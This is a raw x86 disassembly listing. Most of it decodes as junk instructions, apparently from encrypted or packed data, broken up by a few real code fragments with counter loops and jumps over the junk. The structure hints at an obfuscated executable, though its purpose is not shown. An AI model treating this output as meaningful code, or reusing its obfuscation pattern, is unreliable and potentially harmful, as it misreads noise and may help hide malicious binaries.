  40e564:	(bad)  
  40e565:	xor    eax,0x479283c1
  40e56a:	mov    esi,0x453b99ab
  40e56f:	push   ebp
  40e570:	adc    BYTE PTR [eax+edx*1+0x6f],cl
  40e574:	mov    bh,al
  40e576:	pop    ecx
  40e577:	int    0x5a
  40e579:	lahf   
  40e57a:	sbb    al,0x56
  40e57c:	xor    eax,0x64d2b336
  40e581:	pop    ss
  40e582:	(bad)  
  40e583:	cmp    al,0x6a
  40e585:	call   0x3e1c4161
  40e58a:	adc    DWORD PTR [edx],esi
  40e58c:	in     al,0x92
  40e58e:	add    ebp,DWORD PTR [ecx]
  40e590:	mov    ecx,0x579ed175
  40e595:	lods   al,BYTE PTR ds:[esi]
  40e596:	data16 xor al,ch
  40e599:	in     eax,dx
  40e59a:	or     ax,0x8678
  40e59e:	fstp   TBYTE PTR [eax-0x3]
  40e5a1:	clc    
  40e5a2:	pop    ebx
  40e5a3:	cli    
  40e5a4:	je     0x40e595
  40e5a6:	push   0xffffff85
  40e5a8:	in     al,dx
  40e5a9:	out    dx,al
  40e5aa:	test   BYTE PTR gs:[ecx],ch
  40e5ad:	outs   dx,BYTE PTR ds:[esi]
  40e5ae:	das    
  40e5af:	sar    BYTE PTR [ecx+0x5f],cl
  40e5b2:	xchg   ecx,eax
  40e5b3:	jp     0x40e5d3
  40e5b5:	outs   dx,BYTE PTR ds:[esi]
  40e5b6:	dec    edx
  40e5b7:	add    DWORD PTR [edi],esi
  40e5b9:	or     BYTE PTR [ebp*4+0x71f4cb3f],bl
  40e5c0:	rol    DWORD PTR ds:0x65727157,cl
  40e5c6:	add    ebp,DWORD PTR [ebx+esi*1]
  40e5c9:	ror    DWORD PTR [ebp+0x6],1
  40e5cc:	adc    ebx,DWORD PTR [edx+0x60fc8a76]
  40e5d2:	fwait
  40e5d3:	adc    al,0xaa
  40e5d5:	or     esp,DWORD PTR [edx]
  40e5d7:	shr    DWORD PTR gs:[ebx],0x5e
  40e5db:	inc    eax
  40e5dc:	jp     0x40e647
  40e5de:	jno    0x40e581
  40e5e0:	stc    
  40e5e1:	jb     0x40e5ca
  40e5e3:	mov    DWORD PTR [ebp-0x5b1250a1],esp
  40e5e9:	and    ebx,esi
  40e5eb:	jecxz  0x40e619
  40e5ed:	mov    eax,ds:0x394d5180
  40e5f2:	sub    al,0x58
  40e5f4:	jno    0x40e5ac
  40e5f6:	popf   
  40e5f7:	sub    BYTE PTR [esi],ah
  40e5f9:	(bad)
  40e5fc:	xchg   ecx,eax
  40e5fd:	aad    0xef
  40e5ff:	mov    esp,DWORD PTR [edx-0x1c]
  40e602:	int3   
  40e603:	fsub   DWORD PTR [ebp+0xa7920a4]
  40e609:	xchg   ebx,eax
  40e60a:	test   DWORD PTR [esi],0x9337a76
  40e610:	or     DWORD PTR [ebx+0x1d],eax
  40e613:	dec    edx
  40e614:	mov    bl,0xc6
  40e616:	retf   0xa63e
  40e619:	mov    ebp,0xe2592c6b
  40e61e:	fistp  WORD PTR [esi-0x48]
  40e621:	cmp    al,0x5c
  40e623:	call   0xe8a4e7c2
  40e628:	and    eax,0xaf14d4ca
  40e62d:	sub    ebx,DWORD PTR ds:0xf70c1a93
  40e633:	jmp    FWORD PTR [ebp-0x64]
  40e636:	ins    DWORD PTR es:[edi],dx
  40e637:	stos   DWORD PTR es:[edi],eax
  40e638:	in     eax,dx
  40e639:	ret    
  40e63a:	xchg   DWORD PTR [eax+0x3e],eax
  40e63d:	mov    ds:0x757306a0,al
  40e642:	stos   BYTE PTR es:[edi],al
  40e643:	cli    
  40e644:	or     eax,0xfe731af0
  40e649:	jo     0x40e5d7
  40e64b:	lods   al,BYTE PTR ds:[esi]
  40e64c:	inc    edi
  40e64d:	rol    BYTE PTR [ecx],cl
  40e64f:	xchg   ebx,eax
  40e650:	imul   edx,DWORD PTR [edx],0xc64d1341
  40e656:	hlt    
  40e657:	loopne 0x40e60e
  40e659:	adc    al,al
  40e65b:	push   esp
  40e65c:	or     DWORD PTR [ebp-0x12699878],ebp
  40e662:	dec    eax
  40e664:	test   al,0x8f
  40e666:	popf   
  40e667:	arpl   WORD PTR [ebp+0xd],bx
  40e66a:	stos   DWORD PTR es:[edi],eax
  40e66b:	cmc    
  40e66c:	aaa    
  40e66d:	xchg   edi,eax
  40e66e:	outs   dx,BYTE PTR ds:[esi]
  40e66f:	nop
  40e670:	fisub  WORD PTR [ebp-0x5b9f17d8]
  40e676:	mov    edx,0xb158e5a6
  40e67b:	dec    BYTE PTR [ecx+0x46]
  40e67e:	into   
  40e67f:	stc    
  40e680:	mov    dh,0xcb
  40e682:	ret    
  40e683:	pusha  
  40e684:	loopne 0x40e63a
  40e686:	fdivr  QWORD PTR [eax+0x57]
  40e689:	cmp    cl,bh
  40e68b:	fld    QWORD PTR [edx-0x61993834]
  40e691:	aaa    
  40e692:	out    0x7e,eax
  40e694:	xchg   edx,eax
  40e695:	mov    esi,0xfd4e4b8f
  40e69a:	inc    esi
  40e69b:	mov    edx,0xcf907ec9
  40e6a0:	adc    eax,0x9f07bc84
  40e6a5:	xchg   ecx,eax
  40e6a6:	or     al,BYTE PTR [ecx]
  40e6a8:	aam    0xf8
  40e6aa:	inc    esi
  40e6ab:	fidivr WORD PTR [ebx-0x51ab1d6c]
  40e6b1:	mov    bl,0xc2
  40e6b3:	pop    edi
  40e6b4:	pop    ss
  40e6b5:	inc    ebx
  40e6b6:	mov    ds,WORD PTR [eax-0x77f51366]
  40e6bc:	xor    esp,DWORD PTR [eax]
  40e6be:	inc    edi
  40e6bf:	add    DWORD PTR [edx+0x111e4ac0],esi
  40e6c5:	fcomp  QWORD PTR [ebx]
  40e6c7:	jle    0x40e6b6
  40e6c9:	ins    BYTE PTR es:[edi],dx
  40e6ca:	lahf   
  40e6cb:	xchg   ebp,eax
  40e6cc:	and    eax,0x318f2ba3
  40e6d1:	inc    eax
  40e6d2:	and    eax,0x57183265
  40e6d7:	popa   
  40e6d8:	xlat   BYTE PTR ds:[ebx]
  40e6d9:	cmp    edi,DWORD PTR [ebx+0x51]
  40e6dc:	dec    ecx
  40e6dd:	outs   dx,BYTE PTR ds:[esi]
  40e6de:	pop    ds
  40e6df:	fadd   DWORD PTR [esi+eiz*1]
  40e6e2:	xor    DWORD PTR [esi+0x50],edi
  40e6e5:	inc    ax
  40e6e7:	xor    DWORD PTR [ebp-0x34db1a16],edx
  40e6ed:	mov    esp,gs
  40e6ef:	nop
  40e6f0:	cmp    BYTE PTR [ebx],bh
  40e6f2:	and    eax,0xd759b487
  40e6f7:	ror    DWORD PTR [edi-0xf],0xe1
  40e6fb:	sub    BYTE PTR [eax+0x54],0x33
  40e6ff:	mov    BYTE PTR [ebx],0xc3
  40e702:	mov    DWORD PTR [ebp+0x8],eax
  40e705:	mov    eax,ds:0x41eae6
  40e70a:	mov    DWORD PTR [ebp+0x8],eax
  40e70d:	mov    eax,DWORD PTR [ebp-0x14]
  40e710:	mov    DWORD PTR [ebp-0x4],eax
  40e713:	mov    eax,DWORD PTR [ebp-0x4]
  40e716:	push   0x4
  40e718:	pop    ecx
  40e719:	sub    ecx,eax
  40e71b:	add    ecx,DWORD PTR [ebp-0x18]
  40e71e:	mov    DWORD PTR [ebp-0x8],ecx
  40e721:	jmp    0x40e979
  40e726:	(bad)
  40e729:	(bad)  
  40e72a:	leave  
  40e72b:	fcmovbe st,st(5)
  40e72d:	sar    esp,1
  40e72f:	rcr    DWORD PTR [esp+edi*1],1
  40e732:	dec    ebx
  40e733:	clc    
  40e734:	inc    edi
  40e735:	loop   0x40e776
  40e737:	mov    ebx,0x7e357878
  40e73c:	js     0x40e7b6
  40e73e:	xor    eax,0x79878528
  40e743:	fwait
  40e744:	adc    BYTE PTR [eax+ebx*2+0x705f3a58],cl
  40e74b:	outs   dx,BYTE PTR ds:[esi]
  40e74c:	test   BYTE PTR [ebx+0x5f034a94],0x63
  40e753:	xor    cl,BYTE PTR [ecx]
  40e755:	in     al,dx
  40e756:	sbb    BYTE PTR [ebp-0x1cd3d8b6],bl
  40e75c:	jae    0x40e736
  40e75e:	stos   BYTE PTR es:[edi],al
  40e75f:	daa    
  40e760:	pushf  
  40e761:	call   0xcb74d341
  40e766:	xor    al,0x15
  40e768:	cdq    
  40e769:	add    BYTE PTR [ecx-0x6a47f22b],0x7c
  40e770:	outs   dx,BYTE PTR ds:[esi]
  40e771:	out    dx,al
  40e772:	or     dh,BYTE PTR [edi+0x4039ed54]
  40e778:	mov    esi,0x8578d293
  40e77d:	push   0xffffffc7
  40e77f:	jno    0x40e726
  40e781:	scas   eax,DWORD PTR es:[edi]
  40e782:	mov    al,0x40
  40e784:	(bad)  
  40e785:	sbb    BYTE PTR [esi],ah
  40e787:	and    esp,DWORD PTR [ecx+ecx*1-0x306c498f]
  40e78e:	push   ebp
  40e78f:	cs jne 0x40e774
  40e792:	loopne 0x40e7e0
  40e794:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e795:	shl    DWORD PTR [eax],1
  40e797:	lea    ebx,[ebx-0x209b16e5]
  40e79d:	outs   dx,BYTE PTR ds:[esi]
  40e79e:	mov    esp,0x633275ce
  40e7a3:	mov    esi,0x6e1463b1
  40e7a8:	ficom  DWORD PTR [ebp+0x46]
  40e7ab:	adc    ecx,esp
  40e7ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e7ae:	int    0x1
  40e7b0:	loopne 0x40e7bc
  40e7b2:	loopne 0x40e7a4
  40e7b4:	fist   DWORD PTR [edx+ecx*1-0xbfa67d8]
  40e7bb:	mov    esi,0xebc413d1
  40e7c0:	mov    esp,0xaa5632e5
  40e7c5:	mov    edi,0x3d37e57b
  40e7cb:	push   edx
  40e7cc:	mov    ds:0xbad53633,al
  40e7d1:	xor    BYTE PTR [ebx],cl
  40e7d3:	icebp  
  40e7d4:	lds    ebx,FWORD PTR [esi]
  40e7d6:	xor    dh,ch
  40e7d8:	fidivr WORD PTR [ebp-0x62750b26]
  40e7de:	cwde   
  40e7df:	(bad)  
  40e7e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e7e1:	inc    BYTE PTR [ecx-0x2de561b2]
  40e7e7:	xchg   edx,eax
  40e7e8:	xchg   ebx,eax
  40e7e9:	mov    eax,0xc1fdca09
  40e7ee:	fldl2e 
  40e7f0:	sub    al,0xed
  40e7f2:	dec    ebp
  40e7f3:	cld    
  40e7f4:	aaa    
  40e7f5:	mul    BYTE PTR [ebp+0x5b]
  40e7f8:	dec    esp
  40e7f9:	lods   al,BYTE PTR ds:[esi]
  40e7fa:	pop    esp
  40e7fb:	stos   BYTE PTR es:[edi],al
  40e7fc:	dec    ebx
  40e7fd:	stos   BYTE PTR es:[edi],al
  40e7fe:	das    
  40e7ff:	pop    esi
  40e800:	gs ss fdiv st,st(3)
  40e804:	xor    eax,0x33473f3
  40e809:	mov    edx,DWORD PTR [eax+0x55b9e280]
  40e80f:	(bad)  
  40e812:	(bad)  
  40e813:	popf   
  40e814:	xchg   DWORD PTR [edi+ecx*1-0x67e97461],esi
  40e81b:	mov    edi,0xeca10933
  40e820:	jecxz  0x40e7ee
  40e822:	adc    DWORD PTR [ebp-0x6e59715e],0x6
  40e829:	xchg   ah,bh
  40e82b:	adc    al,0x69
  40e82d:	lea    ebp,[ebx+ecx*8]
  40e830:	in     eax,0x7e
  40e832:	retf   
  40e833:	fiadd  WORD PTR [ebx-0x76d1ece9]
  40e839:	outs   dx,BYTE PTR ds:[esi]
  40e83a:	fcom   DWORD PTR [esi]
  40e83c:	xchg   edx,eax
  40e83d:	dec    edx
  40e83e:	xchg   ebp,eax
  40e83f:	popf   
  40e840:	fadd   QWORD PTR [edi]
  40e842:	push   ebx
  40e843:	mov    ds:0x81f4fb3e,eax
  40e848:	or     BYTE PTR [ebx],ch
  40e84a:	cmp    bh,BYTE PTR [ebp-0x5e]
  40e84d:	fcmovb st,st(2)
  40e84f:	out    dx,eax
  40e850:	sbb    al,0xc6
  40e852:	out    0x3,eax
  40e854:	in     al,dx
  40e855:	xor    dh,BYTE PTR [edi+0x68]
  40e858:	imul   edx,esi,0xffffffa3
  40e85b:	cdq    
  40e85c:	jmp    0x1cbe:0xdccd0def
  40e863:	mov    ds:0xc1911c81,al
  40e868:	std    
  40e869:	hlt    
  40e86a:	inc    eax
  40e86b:	dec    ecx
  40e86c:	mov    esp,0xf43e0562
  40e871:	mov    cl,0xee
  40e873:	fcom   QWORD PTR [edi+ebp*4]
  40e876:	xor    bh,dh
  40e878:	dec    esi
  40e879:	push   es
  40e87a:	scas   eax,DWORD PTR es:[edi]
  40e87b:	fsub   st,st(0)
  40e87d:	ds jg  0x40e80f
  40e880:	mov    dh,0xf4
  40e882:	push   esi
  40e883:	mov    cl,0xc4
  40e885:	push   es
  40e886:	gs stos DWORD PTR es:[edi],eax
  40e888:	and    al,0x1e
  40e88a:	ror    BYTE PTR [ebp+0x18],cl
  40e88d:	cli    
  40e88e:	mov    ecx,0x6bc1e0df
  40e893:	cmp    ch,BYTE PTR ds:[ebx-0x29]
  40e897:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e898:	mov    ds:0xdb7b3eef,al
  40e89d:	dec    esp
  40e89e:	daa    
  40e89f:	ja     0x40e86a
  40e8a1:	and    ah,ch
  40e8a3:	lods   al,BYTE PTR ds:[esi]
  40e8a4:	sbb    ebx,DWORD PTR [edi-0x75ee2d29]
  40e8aa:	dec    esp
  40e8ab:	popa   
  40e8ac:	mov    ah,0xfc
  40e8ae:	and    eax,0x4d5b1f7c
  40e8b3:	nop
  40e8b4:	jnp    0x40e91d
  40e8b6:	mov    BYTE PTR [edi+0x428e32f2],bl
  40e8bc:	test   DWORD PTR ds:0x7e89e5ab,ebx
  40e8c2:	scas   al,BYTE PTR es:[edi]
  40e8c3:	dec    esi
  40e8c4:	dec    edi
  40e8c5:	cmc    
  40e8c6:	fs xchg ebp,eax
  40e8c8:	mov    al,0xec
  40e8ca:	or     eax,edx
  40e8cc:	sub    DWORD PTR [edx-0x6a],esi
  40e8cf:	stc    
  40e8d0:	and    eax,0x74c8397c
  40e8d5:	repz in al,dx
  40e8d7:	fs push es
  40e8d9:	add    edx,DWORD PTR [edx-0x6179d415]
  40e8df:	ja     0x40e8a4
  40e8e1:	cdq    
  40e8e2:	int    0x87
  40e8e4:	or     ebp,0xd643c2e9
  40e8ea:	test   DWORD PTR [ebx+0x4f],esi
  40e8ed:	adc    ebx,DWORD PTR [edi-0x65d05e00]
  40e8f3:	adc    DWORD PTR [eax+edi*1],ebx
  40e8f6:	jns    0x40e943
  40e8f8:	scas   al,BYTE PTR es:[edi]
  40e8f9:	icebp  
  40e8fa:	dec    esi
  40e8fb:	and    BYTE PTR [edi+0x6f],dl
  40e8fe:	sub    al,0xe1
  40e900:	and    bl,BYTE PTR [ebp*1-0x36a828f0]
  40e907:	imul   edi,eax,0x1c
  40e90a:	ds inc ebp
  40e90c:	adc    edx,DWORD PTR [esi]
  40e90e:	mov    edi,0x30bf27d7
  40e913:	mov    ebx,0x8e23ae75
  40e918:	dec    esi
  40e919:	cld    
  40e91a:	test   al,0x79
  40e91c:	jb     0x40e8b0
  40e91e:	jno    0x40e8b1
  40e920:	mov    ds:0x216a1a41,al
  40e925:	sahf   
  40e926:	outs   dx,DWORD PTR ds:[esi]
  40e927:	sti    
  40e928:	dec    esi
  40e929:	mov    dh,0x5f
  40e92b:	ficomp DWORD PTR [eax-0x32aedd02]
  40e931:	(bad)  
  40e933:	inc    esp
  40e934:	mov    ecx,0x571b7afa
  40e939:	scas   al,BYTE PTR es:[edi]
  40e93a:	mov    ah,0x3a
  40e93c:	imul   ebx,DWORD PTR [esi],0xeb222845
  40e942:	mov    ebx,0xaeabe6a6
  40e947:	bound  ecx,QWORD PTR [edi]
  40e949:	adc    al,0x64
  40e94b:	dec    ecx
  40e94c:	ins    DWORD PTR es:[edi],dx
  40e94d:	fisttp QWORD PTR [eax+0x7558cb92]
  40e953:	outs   dx,DWORD PTR ds:[esi]
  40e954:	cmp    BYTE PTR [edx+0x40],0xbd
  40e958:	test   DWORD PTR [ebx-0x40d9bc66],ecx
  40e95e:	cdq    
  40e95f:	sbb    bl,BYTE PTR [esi-0x5c4663f5]
  40e965:	test   al,0xf1
  40e967:	xchg   ebp,eax
  40e968:	ins    DWORD PTR es:[edi],dx
  40e969:	cli    
  40e96a:	clc    
  40e96b:	out    0xf7,eax
  40e96d:	int    0x8c
  40e96f:	mov    al,0xc1
  40e971:	jno    0x40e948
  40e973:	into   
  40e974:	aas    
  40e975:	out    0xb2,al
  40e977:	outs   dx,BYTE PTR ds:[esi]
  40e978:	call   0x8dc6:0x330c458b
  40e97f:	mov    esp,0x32729807
  40e984:	add    BYTE PTR [ecx+0x50aff],al
  40e98a:	add    BYTE PTR [edi],cl
  40e98c:	test   DWORD PTR [esi-0x74000015],ecx
  40e992:	inc    ebp
  40e993:	or     al,0x5f
  40e995:	xor    eax,esi
  40e997:	pop    esi
  40e998:	add    eax,ebx
  40e99a:	pop    ebx
  40e99b:	leave  
  40e99c:	ret    0x8
  40e99f:	push   ebp
  40e9a0:	mov    ebp,esp
  40e9a2:	sub    esp,0x44
  40e9a5:	push   edi
  40e9a6:	mov    eax,DWORD PTR [ebp+0xc]
  40e9a9:	mov    DWORD PTR [ebp-0x10],eax
  40e9ac:	mov    eax,DWORD PTR [ebp+0x8]
  40e9af:	and    DWORD PTR ds:0x42a811,0x0
  40e9b9:	mov    edx,DWORD PTR ds:0x42a811
  40e9bf:	inc    edx
  40e9c0:	mov    DWORD PTR ds:0x42a811,edx
  40e9c6:	cmp    DWORD PTR ds:0x42a811,0x6
  40e9cd:	jne    0x40e9dc
  40e9d3:	push   DWORD PTR [ebp-0x28]
  40e9d6:	call   DWORD PTR ds:0x41d250
  40e9dc:	cmp    DWORD PTR ds:0x42a811,0x5
  40e9e3:	jne    0x40e9f6
  40e9e9:	mov    edx,DWORD PTR ds:0x42a811
  40e9ef:	inc    edx
  40e9f0:	mov    DWORD PTR ds:0x42a811,edx
  40e9f6:	cmp    DWORD PTR ds:0x42a811,0x10
  40e9fd:	jb     0x40e9b9
  40ea03:	mov    DWORD PTR [ebp+0x8],0xf89c8538
  40ea0a:	mov    DWORD PTR [ebp-0x20],0xf89c8539
  40ea11:	jmp    0x40ec99
  40ea16:	cmp    eax,0xd6ce3ed7
  40ea1b:	aad    0xcd
  40ea1d:	xlat   BYTE PTR ds:[ebx]
  40ea1e:	jecxz  0x40e9ce
  40ea20:	ja     0x40e9b6
  40ea22:	iret   
  40ea23:	ss arpl di,si
  40ea26:	hlt    
  40ea27:	mov    ecx,0x7ee57878
  40ea2c:	js     0x40eaa6
  40ea2e:	fs inc ecx
  40ea30:	(bad)  
  40ea32:	xor    BYTE PTR [ecx+0x1a],0xcb
  40ea36:	push   ebp
  40ea37:	inc    esi
  40ea38:	ins    DWORD PTR es:[edi],dx
  40ea39:	pusha  
  40ea3a:	lahf   
  40ea3b:	jae    0x40e9df
  40ea3d:	or     edi,DWORD PTR [edi+ebp*4+0x1e]
  40ea41:	dec    eax
  40ea42:	push   edx
  40ea43:	jmp    0xc300cb7c
  40ea48:	sbb    cl,ch
  40ea4a:	mov    ss,WORD PTR [edi]
  40ea4c:	push   eax
  40ea4d:	(bad)  [edi-0x3]
  40ea50:	repnz and ebp,esp
  40ea53:	or     eax,0x198cc758
  40ea58:	mov    DWORD PTR [ebx-0x855b262],edi
  40ea5e:	adc    ch,ch
  40ea60:	xlat   BYTE PTR ds:[ebx]
  40ea61:	into   
  40ea62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea63:	add    esp,DWORD PTR [eax]
  40ea65:	clc    
  40ea66:	add    al,BYTE PTR [eax+0x53199f4e]
  40ea6c:	pop    ss
  40ea6d:	lea    ebx,[ebp+0x644fe74c]
  40ea73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea74:	xlat   BYTE PTR ds:[ebx]
  40ea75:	xchg   edx,eax
  40ea76:	ds ret 
  40ea78:	jbe    0x40ea18
  40ea7a:	pushf  
  40ea7b:	gs data16 in al,0x94
  40ea7f:	push   0xc
  40ea81:	cld    
  40ea82:	ret    0x4cf0
  40ea85:	and    bl,0xa9
  40ea88:	ret    0x856e
  40ea8b:	push   0xb98b2429
  40ea90:	popa   
  40ea91:	stc    
  40ea92:	jp     0x40eaf4
  40ea94:	rol    BYTE PTR [esi-0x467b4c1b],1
  40ea9a:	js     0x40ea90
  40ea9c:	das    
  40ea9d:	sub    dl,bh
  40ea9f:	dec    edi
  40eaa0:	xchg   ebx,eax
  40eaa1:	call   0x5fc5c80d
  40eaa6:	scas   al,BYTE PTR es:[edi]
  40eaa7:	cmp    al,0xe6
  40eaa9:	jge    0x40ead8
  40eaab:	mov    cl,0x5b
  40eaad:	pop    edi
  40eaae:	(bad)  
  40eaaf:	stc    
  40eab0:	pop    edi
  40eab1:	fs std 
  40eab3:	je     0x40eab8
  40eab5:	das    
  40eab6:	sub    BYTE PTR ds:0x6b9132f0,cl
  40eabc:	ins    BYTE PTR es:[edi],dx
  40eabd:	inc    eax
  40eabe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eabf:	sbb    ecx,ebx
  40eac1:	dec    edx
  40eac2:	mov    al,0xe4
  40eac4:	and    cl,ch
  40eac6:	addr16 clc 
  40eac8:	and    BYTE PTR [esi+ecx*1+0x11],bl
  40eacc:	loope  0x40eac6
  40eace:	xor    eax,0xd7373f93
  40ead3:	loope  0x40eae8
  40ead5:	dec    DWORD PTR [edx]
  40ead7:	repz repz dec ebp
  40eada:	mov    DWORD PTR [ebx+0x1e1cb636],edx
  40eae0:	cmp    cl,BYTE PTR [ebx-0x6]
  40eae3:	mov    edi,0x5b636748
  40eae8:	test   DWORD PTR ds:0x6662d073,ebp
  40eaee:	or     ecx,esi
  40eaf0:	push   ecx
  40eaf1:	aad    0xf2
  40eaf3:	mov    edi,0xfe9ca322
  40eaf8:	inc    edx
  40eaf9:	aad    0xc
  40eafb:	fs aaa 
  40eafd:	nop
  40eafe:	sbb    DWORD PTR [ecx+0x291f0106],0x29
  40eb05:	hlt    
  40eb06:	mov    eax,0x78305082
  40eb0b:	outs   dx,DWORD PTR ds:[esi]
  40eb0c:	sbb    BYTE PTR [ecx-0x2b6e7271],dh
  40eb12:	fisttp QWORD PTR [eax+edi*2+0x24a0303c]
  40eb19:	bound  edi,QWORD PTR [esi]
  40eb1b:	xchg   ecx,eax
  40eb1c:	nop
  40eb1d:	push   eax
  40eb1e:	cld    
  40eb1f:	xor    bh,BYTE PTR [ebp+ecx*2-0x41]
  40eb23:	add    eax,0xd9747b02
  40eb28:	dec    ebx
  40eb29:	jae    0x40eb38
  40eb2b:	scas   eax,DWORD PTR es:[edi]
  40eb2c:	xchg   ebx,eax
  40eb2d:	out    0x59,eax
  40eb2f:	lds    esi,FWORD PTR [edx-0x5f]
  40eb32:	mov    esi,ds
  40eb34:	fadd   DWORD PTR [eax-0xd62a15e]
  40eb3a:	mov    dh,0x93
  40eb3c:	retf   0x9651
  40eb3f:	les    edi,FWORD PTR [eax]
  40eb41:	and    al,0xca
  40eb43:	(bad)  
  40eb44:	fdiv   st,st(5)
  40eb46:	cld    
  40eb47:	stos   BYTE PTR es:[edi],al
  40eb48:	push   esi
  40eb49:	cmc    
  40eb4a:	je     0x40eb18
  40eb4c:	bound  esi,QWORD PTR [ebx-0x3c25d59c]
  40eb52:	jnp    0x40eb81
  40eb54:	rcr    BYTE PTR [ecx+0x72],1
  40eb57:	adc    edx,DWORD PTR [edx-0x6c664d8b]
  40eb5d:	ins    DWORD PTR es:[edi],dx
  40eb5e:	pop    esi
  40eb5f:	loopne 0x40eb97
  40eb61:	add    eax,0x972f10ea
  40eb66:	call   0x699eb846
  40eb6b:	int    0xa9
  40eb6d:	fcmovnb st,st(2)
  40eb6f:	mov    al,ds:0xaa2659b2
  40eb74:	rcl    DWORD PTR [ebx+edx*2],1
  40eb77:	cmp    DWORD PTR [esi],ebx
  40eb79:	in     eax,0x99
  40eb7b:	xor    BYTE PTR [ebx+0x2a],dh
  40eb7e:	jecxz  0x40ebc1
  40eb80:	jnp    0x40eb2b
  40eb82:	loope  0x40ebaf
  40eb84:	neg    ecx
  40eb86:	jae    0x40eb54
  40eb88:	into   
  40eb89:	mov    ds:0x7ed22c54,eax
  40eb8e:	(bad)  
  40eb8f:	gs out 0x99,eax
  40eb92:	mov    ah,0x30
  40eb94:	repnz cli 
  40eb96:	mov    bh,0x39
  40eb98:	pop    ss
  40eb99:	mov    esi,0x9b190992
  40eb9e:	in     eax,0x2f
  40eba0:	or     BYTE PTR [ebx+0x28],ch
  40eba3:	mov    WORD PTR fs:[ecx+ecx*2+0x7],ds
  40eba8:	push   ds
  40eba9:	mov    al,ds:0x8aa1c8a6
  40ebae:	fwait
  40ebaf:	xlat   BYTE PTR ds:[ebx]
  40ebb0:	loop   0x40ebe5
  40ebb2:	dec    edx
  40ebb3:	jmp    0x40ebeb
  40ebb5:	add    ah,bh
  40ebb7:	iret   
  40ebb8:	dec    ecx
  40ebb9:	xlat   BYTE PTR ds:[ebx]
  40ebba:	mov    eax,0xd89920dc
  40ebbf:	aad    0x52
  40ebc1:	dec    eax
  40ebc2:	sbb    al,0xe1
  40ebc4:	(bad)  
  40ebc5:	jae    0x40eb4d
  40ebc7:	sbb    cl,bl
  40ebc9:	sub    eax,0xf0a1fd9d
  40ebce:	and    eax,0xc3424ca2
  40ebd3:	jg     0x40ec07
  40ebd5:	jne    0x40ebfd
  40ebd7:	(bad)  
  40ebd8:	shl    BYTE PTR [edx-0x79],0xf4
  40ebdc:	dec    ecx
  40ebdd:	dec    ecx
  40ebde:	push   es
  40ebdf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ebe0:	jmp    0x40ebbe
  40ebe2:	or     al,0xea
  40ebe4:	fidiv  DWORD PTR [esi-0x50cda027]
  40ebea:	repz jle 0x40eb98
  40ebed:	(bad)  
  40ebee:	retf   
  40ebef:	jno    0x40ec6b
  40ebf1:	fsub   QWORD PTR [edx-0xf]
  40ebf4:	(bad)  
  40ebf5:	adc    al,0xcf
  40ebf7:	ret    0x36ea
  40ebfa:	cli    
  40ebfb:	mov    bl,0x8d
  40ebfd:	outs   dx,DWORD PTR ds:[esi]
  40ebfe:	mov    esi,0xbbc2a196
  40ec03:	popf   
  40ec04:	sbb    cl,BYTE PTR [edi+0x3f17e0ab]
  40ec0a:	fcomp  DWORD PTR [ebp+0x8159e5f]
  40ec10:	sti    
  40ec11:	or     DWORD PTR [eax+eiz*1],esi
  40ec14:	enter  0x7ab8,0x63
  40ec18:	push   esi
  40ec19:	lds    edx,FWORD PTR [esi]
  40ec1b:	xlat   BYTE PTR ds:[ebx]
  40ec1c:	xchg   esp,eax
  40ec1d:	pop    edi
  40ec1e:	jp     0x40ebd7
  40ec20:	xchg   edi,eax
  40ec21:	push   ds
  40ec22:	fstp   TBYTE PTR [edi+eiz*4+0x4e]
  40ec26:	sub    bh,ch
  40ec28:	je     0x40ec0b
  40ec2a:	jmp    0x60dc22de
  40ec2f:	add    eax,0x97fe844d
  40ec34:	jp     0x40ebd0
  40ec36:	loopne 0x40ec94
  40ec38:	cdq    
  40ec39:	cmp    cl,0x27
  40ec3c:	inc    ebp
  40ec3d:	inc    ecx
  40ec3e:	lds    esi,FWORD PTR [esi+0x7029e241]
  40ec44:	xor    dl,BYTE PTR ds:0x3f02e59d
  40ec4a:	test   BYTE PTR [ebx-0x374066a1],0x5c
  40ec51:	ins    BYTE PTR es:[edi],dx
  40ec52:	xchg   ebp,eax
  40ec53:	jnp    0x40ec76
  40ec55:	pop    ecx
  40ec56:	xor    al,0x30
  40ec58:	pop    ecx
  40ec59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec5a:	retf   
  40ec5b:	jge    0x40ec5f
  40ec5d:	cmp    dl,BYTE PTR [ecx+esi*2]
  40ec60:	push   esp
  40ec61:	out    dx,eax
  40ec62:	xor    al,0xe7
  40ec64:	xchg   edi,eax
  40ec65:	leave  
  40ec66:	outs   dx,DWORD PTR ds:[esi]
  40ec67:	ins    DWORD PTR es:[edi],dx
  40ec68:	push   edx
  40ec69:	jle    0x40ec62
  40ec6b:	xor    eax,0x7ea62413
  40ec70:	idiv   DWORD PTR [edi-0x73]
  40ec73:	dec    edx
  40ec74:	pusha  
  40ec75:	enter  0x1051,0x47
  40ec79:	pop    ebp
  40ec7a:	pop    ecx
  40ec7b:	ss ins BYTE PTR es:[edi],dx
  40ec7d:	aaa    
  40ec7e:	dec    eax
  40ec7f:	xor    cl,BYTE PTR [eax]
  40ec81:	stos   DWORD PTR es:[edi],eax
  40ec82:	jp     0x40ecd8
  40ec84:	mov    ebx,DWORD PTR [esi]
  40ec86:	aad    0x8a
  40ec88:	std    
  40ec89:	sub    BYTE PTR [ebp-0x2e],ah
  40ec8c:	xor    al,0x21
  40ec8e:	mov    eax,ds:0x46a932c9
  40ec93:	jle    0x40ecfb
  40ec95:	pop    edi
  40ec96:	addps  xmm0,XMMWORD PTR [ebx-0x75]
  40ec9a:	push   ebp
  40ec9b:	or     BYTE PTR [ebx],cl
  40ec9d:	or     eax,0x42a79d
  40eca2:	mov    DWORD PTR [ebp-0x40],eax
  40eca5:	mov    eax,0x7510850
  40ecaa:	xor    edx,eax
  40ecac:	add    edi,0x2fd0
  40ecb2:	mov    ecx,0x327298
  40ecb7:	mov    DWORD PTR ds:0x42a899,0x17
  40ecc1:	cmp    DWORD PTR ds:0x42a899,0x0
  40ecc8:	je     0x40ed80
  40ecce:	cmp    DWORD PTR ds:0x42a899,0x5
